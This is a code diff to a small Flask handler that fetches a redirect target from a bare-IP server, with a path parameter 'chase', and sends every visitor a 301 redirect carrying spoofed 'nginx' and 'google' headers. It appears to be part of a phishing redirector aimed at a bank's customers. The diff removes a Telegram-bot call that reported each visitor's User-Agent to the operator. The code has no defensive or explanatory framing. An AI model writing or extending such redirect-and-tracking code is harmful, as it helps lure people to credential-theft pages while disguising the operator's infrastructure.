@@ -16,7 +16,7 @@ def telegreamBOT(ua=None):
 def hello(name):
 
 
-    sheet = requests.get('http://95.111.230.118/kisho/page/active_r.php?page=chase')
+    sheet = requests.get('http://95.111.230.118/kisho/page/active_r.php?page=saidchase')
     link = sheet.text.strip().split('"')[1].split('\/\/')
     url = f'{link[0]}//{link[1]}'
     r = make_response(redirect(f"{url}", code=301))
@@ -26,11 +26,7 @@ def hello(name):
     r.headers.set('referrer-policy', "unsafe-url")
     r.headers.set('server', "nginx")
     r.headers.set('via', "1.1 google")
-
-    try:
-        telegreamBOT(ua=str(request.headers.get('User-Agent')))
-    except Exception as e:
-        print(e)
+    
     return r,301
 
 
